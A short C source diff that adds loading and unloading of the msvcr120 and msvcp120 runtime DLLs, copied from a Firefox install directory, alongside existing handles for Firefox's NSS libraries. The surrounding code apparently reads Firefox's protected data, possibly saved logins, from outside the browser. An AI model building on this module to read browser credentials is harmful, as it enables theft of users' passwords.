@@ -135,6 +135,8 @@ HMODULE libpld = NULL;
 HMODULE libsof = NULL;
 HMODULE libtmp = NULL;
 HMODULE libmsvcrt = NULL;
+HMODULE libmsvcrt120 = NULL;
+HMODULE libmsvcrtp120 = NULL;
 
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
@@ -243,6 +245,16 @@ void FireFoxInitFunc()
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcr100.dll");
 		HM_CompletePath("msvcr100.dll", destPath);
 		libmsvcrt = CopyAndLoadDLL(loadPath, destPath);
+	}
+	if (!libmsvcrt120 && GetModuleHandle("msvcr120.dll") == NULL) {
+		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcr120.dll");
+		HM_CompletePath("msvcr120.dll", destPath);
+		libmsvcrt120 = CopyAndLoadDLL(loadPath, destPath);
+	}
+	if (!libmsvcrtp120 && GetModuleHandle("msvcp120.dll") == NULL) {
+		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcp120.dll");
+		HM_CompletePath("msvcp120.dll", destPath);
+		libmsvcrtp120 = CopyAndLoadDLL(loadPath, destPath);
 	}
 
 	if (!libcrt) {
@@ -384,6 +396,16 @@ void FireFoxUnInitFunc()
 		Sleep(100);
 		FreeLibrary(libmsvcrt);
 	}
+	if (libmsvcrt120 != NULL) {
+		FreeLibrary(libmsvcrt120);
+		Sleep(100);
+		FreeLibrary(libmsvcrt120);
+	}
+	if (libmsvcrtp120 != NULL) {
+		FreeLibrary(libmsvcrtp120);
+		Sleep(100);
+		FreeLibrary(libmsvcrtp120);
+	}
 
 	libnss = NULL;
 	libplc = NULL;
@@ -395,6 +417,8 @@ void FireFoxUnInitFunc()
 	libsof = NULL;
 	libtmp = NULL;
 	libmsvcrt = NULL;
+	libmsvcrt120 = NULL;
+	libmsvcrtp120 = NULL;
 
 }
 
